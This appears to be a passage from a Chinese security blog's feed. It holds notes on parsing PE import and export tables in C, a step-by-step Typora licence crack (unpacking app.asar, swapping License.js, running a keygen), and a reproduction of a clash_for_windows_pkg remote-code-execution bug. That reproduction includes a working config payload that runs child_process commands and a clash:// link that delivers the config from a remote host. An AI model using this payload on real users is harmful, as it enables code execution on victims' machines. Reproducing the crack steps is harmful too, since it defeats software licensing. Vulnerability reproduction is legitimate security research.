operator">-></span>OriginalFirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token comment">// 指向导入地址表的 RVA</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		PIMAGE_THUNK_DATA pIat <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_THUNK_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token comment">// 声明变量：导入表的偏移和补位</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		DWORD index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		DWORD ImportOffset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>		<span class="token comment">// 被导入函数的序号</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token keyword">while</span> <span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Ordinal <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkRva：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>OriginalFirstThunk <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>			ImportOffset <span class="token operator">=</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkOffset：%08X\n"</span><span class="token punctuation">,</span> ImportOffset <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>			index <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Ordinal <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>				PIMAGE_IMPORT_BY_NAME pName <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_BY_NAME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>AddressOfData<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"API名称：%s\n"</span><span class="token punctuation">,</span> pName<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 名称</span></pre></td></tr><tr><td data-num="39"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hint(序号)：%04X\n"</span><span class="token punctuation">,</span> pName<span class="token operator">-></span>Hint<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 序号</span></pre></td></tr><tr><td data-num="40"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkValue：%08X\n\n"</span><span class="token punctuation">,</span> pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 被导入函数的地址</span></pre></td></tr><tr><td data-num="41"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>			pIat <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		pImport <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-3"><a class="anchor" href="#运行结果-3">#</a> 运行结果</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226142448246.png" alt="image-20220226142448246" /></p>
<h2 id="报错"><a class="anchor" href="#报错">#</a> 报错</h2>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>ntdll.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="2"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>kernel32.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="3"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>KernelBase.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="4"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>vcruntime140d.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="5"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>ucrtbased.dll”。无法查找或打开 PDB 文件。</pre></td></tr></table></figure><h3 id="报错原因"><a class="anchor" href="#报错原因">#</a> 报错原因</h3>
<p>因为之前换行符 &quot;\&quot; 显示为 &quot;￥&quot;，所以更换了字体为 <code>仿宋体</code> 从而导致部分符号需重新挂载</p>
<h3 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h3>
<ol>
<li>点 <code>调试</code> ，然后  <code>选项</code></li>
</ol>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226122642938.png" alt="image-20220226122642938" /></p>
<ol start="2">
<li>右边勾上  <code>启用源服务器支持</code></li>
</ol>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226122743439.png" alt="image-20220226122743439" /></p>
<ol start="3">
<li>左边点  <code>符号</code> ，把  <code>微软符号服务器</code>  勾选上</li>
</ol>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226122823133.png" alt="image-20220226122823133" /></p>
<ol start="4">
<li>运行的时候等一下，等待加载完成后就好了。</li>
</ol>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226122854825.png" alt="image-20220226122854825" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226123337123.png" alt="image-20220226123337123" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Typroa破解记录</title>
    <url>/article/ce12b2b3.html</url>
    <content><![CDATA[<p>Typroa 从当初的免费开源用到现在开始收费，早已习惯了 Typroa 的使用，但迟迟没有破解，趁着偷闲时候来破解一番</p>
<p>这样的索大谁能不爱啊！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213212547998.png" alt="image-20220213212547998" /></p>
<h1 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h1>
<ul>
<li><code>python3</code>  环境</li>
<li><code>typroa v1.0</code></li>
</ul>
<h1 id="破解教程"><a class="anchor" href="#破解教程">#</a> 破解教程</h1>
<h2 id="typroa安装"><a class="anchor" href="#typroa安装">#</a> Typroa 安装</h2>
<p>进入官网下载安装所需的 Typroa</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudHlwb3JhLm5ldC8=">官网链接</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201532908.png" alt="image-20220213201532908" /></p>
<p>双击进行安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201727667.png" alt="image-20220213201727667" /></p>
<p>一路默认安装即可，安装地址如有需求可自行更改</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201808709.png" alt="image-20220213201808709" /></p>
<p>安装完成自启也可取消</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201907812.png" alt="image-20220213201907812" /></p>
<p>可以看到此时的 Typroa 处于未激活状态</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213201952056.png" alt="image-20220213201952056" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213203822679.png" alt="image-20220213203822679" /></p>
<h3 id="项目破解"><a class="anchor" href="#项目破解">#</a> 项目破解</h3>
<h4 id="下载破解项目"><a class="anchor" href="#下载破解项目">#</a> 下载破解项目</h4>
<p>使用 GitHub 上的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01hczBuU2hpL3R5cG9yYUNyYWNrZXI="> typoraCracker</span> 项目进行破解</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213202137943.png" alt="image-20220213202137943" /></p>
<p>使用 git 克隆脚本文件（需配置好 git）或者直接下载即可</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#采用命令行进行 gitclone</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#打开命令行工具 (win+R 输入 cmd)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">git</span> clone https://github.com.cnpmjs.org/Mas0nShi/typoraCracker.git</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213202352897.png" alt="image-20220213202352897" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213202955646.png" alt="image-20220213202955646" /></p>
<h4 id="安装依赖项"><a class="anchor" href="#安装依赖项">#</a> 安装依赖项</h4>
<p>通过 pip 命令对 requirements.txt 文件中的依赖项进行安装</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>pip <span class="token function">install</span> -r requirements.txt -i http://pypi.douban.com/simple --trusted-host pypi.douban.com --user</pre></td></tr></table></figure><p>找到 Typora 安装目录下的 <code>resources</code>  目录</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213203232475.png" alt="image-20220213203232475" /></p>
<p>找到 <code>resources</code>  目录下的 <code>app.asar</code>  文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213203305874.png" alt="image-20220213203305874" /></p>
<p>默认目录是在  <code>C:\Program Files\Typora\resources\app.asar</code> ，如有更改请自行更换。</p>
<h4 id="执行解包命名"><a class="anchor" href="#执行解包命名">#</a> 执行解包命名</h4>
<p>Windows 下如果路径是有空格的，需要用 <code>&quot;&quot;</code>  包起来，如果提示权限问题，用管理员身份运行命令行，建议后续都用管理员身份执行。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token string">"C:\Program Files\Typora\resources\app.asar"</span> workstation\outfile\</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213210806446.png" alt="image-20220213210806446" /></p>
<p>使用脚本文件夹 <code>example\path\License.js</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213210914056.png" alt="image-20220213210914056" /></p>
<p>替换掉 <code>workstation\outfile\dec_app\License.js</code>  文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211003173.png" alt="image-20220213211003173" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211059864.png" alt="image-20220213211059759" /></p>
<p>打包 <code>app.asar</code>  文件</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token operator">-</span>u workstation\outfile\dec_app workstation\outappasar</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211156023.png" alt="image-20220213211156023" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211353468.png" alt="image-20220213211353468" /></p>
<p>如遇报错:</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">|</span> ERROR <span class="token operator">|</span> __main__:packWenc:103 - plz input Directory <span class="token keyword">for</span> app.asar</pre></td></tr><tr><td data-num="2"></td><td><pre>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:</pre></td></tr><tr><td data-num="3"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">151</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre> main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">146</span>, <span class="token keyword">in</span> main</pre></td></tr><tr><td data-num="6"></td><td><pre> args.mode<span class="token punctuation">(</span>args.asarPath, args.dirPath, args.format<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">104</span>, <span class="token keyword">in</span> packWenc</pre></td></tr><tr><td data-num="8"></td><td><pre> raise NotADirectoryError</pre></td></tr><tr><td data-num="9"></td><td><pre>NotADirectoryError</pre></td></tr></table></figure><p>手动在脚本路径下打包 <code>workstation/outappasar</code>  文件夹就行了:</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>mkdir workstation<span class="token operator">/</span>outappasar</pre></td></tr><tr><td data-num="2"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token operator">-</span>u workstation\outfile\dec_app workstation\outappasar</pre></td></tr></table></figure><p>将打包回来的 <code>app.asar</code>  文件重新丢到 <code>Typora</code>  的 <code>resources</code>  目录下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211418146.png" alt="image-20220213211418146" /></p>
<p>如恐意外可将原文件复制一份</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211518576.png" alt="image-20220213211518576" /></p>
<h4 id="授权码生成"><a class="anchor" href="#授权码生成">#</a> 授权码生成</h4>
<p>需要安装 <code>nodejs</code>  环境，如果没有安装请自行安装。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#验证 node 安装:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">node</span> -v</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">node</span> example/keygen.js</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213211824091.png" alt="image-20220213211824091" /></p>
<h4 id="激活"><a class="anchor" href="#激活">#</a> 激活</h4>
<p>授权码输入生成的码，邮箱输入 <code>crack@example.com</code> ，完事。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220213212121736.png" alt="image-20220213212121736" /></p>
<p><code>PS：破解后部分功能可能会出现失效情况！</code></p>
<p><code>建议使用正版！！！</code></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>clash_for_windows_pkg RCE</title>
    <url>/article/4120caeb.html</url>
    <content><![CDATA[<h2 id="描述"><a class="anchor" href="#描述">#</a> 描述</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZuZHJvaWQvY2xhc2hfZm9yX3dpbmRvd3NfcGtn">clash_for_windows_pkg</span> 由 Electron 提供。如果 XSS 负载以代理的名义存在，我们可以在受害者的计算机上远程执行任何 JavaScript 代码。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220225172245405.png" alt="image-20220225172245405" /></p>
<h2 id="受影响版本的clash_for_windows_pkg"><a class="anchor" href="#受影响版本的clash_for_windows_pkg">#</a> 受影响版本的 clash_for_windows_pkg</h2>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>version: <span class="token number">0.19</span>.8</pre></td></tr><tr><td data-num="2"></td><td><pre>Platform: Windows</pre></td></tr><tr><td data-num="3"></td><td><pre>OS specifics: Windows <span class="token number">10</span></pre></td></tr></table></figure><h2 id="poc"><a class="anchor" href="#poc">#</a> PoC</h2>
<ol>
<li>导入以下 clash 配置文件：</li>
</ol>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>port<span class="token punctuation">:</span> <span class="token number">7890</span></pre></td></tr><tr><td data-num="2"></td><td><pre>socks<span class="token operator">-</span>port<span class="token punctuation">:</span> <span class="token number">7891</span></pre></td></tr><tr><td data-num="3"></td><td><pre>allow<span class="token operator">-</span>lan<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="4"></td><td><pre>mode<span class="token punctuation">:</span> Rule</pre></td></tr><tr><td data-num="5"></td><td><pre>log<span class="token operator">-</span>level<span class="token punctuation">:</span> info</pre></td></tr><tr><td data-num="6"></td><td><pre>external<span class="token operator">-</span>controller<span class="token punctuation">:</span> <span class="token punctuation">:</span><span class="token number">9090</span></pre></td></tr><tr><td data-num="7"></td><td><pre>proxies<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token operator">-</span> name<span class="token punctuation">:</span> a<span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr><tr><td data-num="9"></td><td><pre>    type<span class="token punctuation">:</span> socks5</pre></td></tr><tr><td data-num="10"></td><td><pre>    server<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    port<span class="token punctuation">:</span> <span class="token string double-quoted-string">"17938"</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    skip<span class="token operator">-</span>cert<span class="token operator">-</span>verify<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token operator">-</span> name<span class="token punctuation">:</span> abc</pre></td></tr><tr><td data-num="14"></td><td><pre>    type<span class="token punctuation">:</span> socks5</pre></td></tr><tr><td data-num="15"></td><td><pre>    server<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    port<span class="token punctuation">:</span> <span class="token string double-quoted-string">"8088"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    skip<span class="token operator">-</span>cert<span class="token operator">-</span>verify<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>proxy<span class="token operator">-</span>groups<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token operator">-</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    name<span class="token punctuation">:</span> <span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr><tr><td data-num="22"></td><td><pre>    type<span class="token punctuation">:</span> select</pre></td></tr><tr><td data-num="23"></td><td><pre>    proxies<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token operator">-</span> a<span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr></table></figure><ol start="2">
<li>在 “配置文件” 中切换到它</li>
<li>单击 “代理” 列（有时不需要）</li>
</ol>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220225172446921.png" alt="image-20220225172446921" /></p>
<p>弹出 calc</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220225172150724.png" alt="image-20220225172150724" /></p>
<p><strong>注意:</strong></p>
<ul>
<li>您需要确保有效负载显示在代理列中。</li>
<li>该漏洞理论上是稳定的，但有时可能需要重新启动 clash_for_windows_pkg 并复制该漏洞</li>
</ul>
<h2 id="a-way-to-exploit"><a class="anchor" href="#a-way-to-exploit">#</a> A way to Exploit</h2>
<p>将配置文件放到浏览器上使用  <code>clash://</code>  安装它，clash_for_windows_pkg 将自动下载并切换到它。</p>
<p>例如：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>clash://install-config?url<span class="token operator">=</span>http%3A%2F%2F1.1.1.1%3A8888%2F1.txt<span class="token operator">&amp;</span><span class="token assign-left variable">name</span><span class="token operator">=</span>RCE</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows PE文件结构解析Studying Notes之导出表与重定位表结构解析</title>
    <url>/article/61ca529c.html</url>
    <content><![CDATA[<h1 id="导出表结构解析"><a class="anchor" href="#导出表结构解析">#</a> 导出表结构解析</h1>
<p>PE 编辑器中的导出表信息</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226190817553.png" alt="image-20220226190817553" /></p>
<p>VS 中导出表结构信息</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_EXPORT_DIRECTORY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   Characteristics<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   TimeDateStamp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    WORD    MajorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    WORD    MinorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    DWORD   Name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    DWORD   Base<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    DWORD   NumberOfFunctions<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    DWORD   NumberOfNames<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    DWORD   AddressOfFunctions<span class="token punctuation">;</span>     <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    DWORD   AddressOfNames<span class="token punctuation">;</span>         <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    DWORD   AddressOfNameOrdinals<span class="token punctuation">;</span>  <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_EXPORT_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226190938370.png" alt="image-20220226190938370" /></p>
<h2 id="测试代码"><a class="anchor" href="#测试代码">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导出表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ExportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">ExportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表中的导出表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pExportDir <span class="token operator">=</span> pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充导出表结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_EXPORT_DIRECTORY pExport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> szName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfFunctions <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"当前没有导出表！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">return</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token 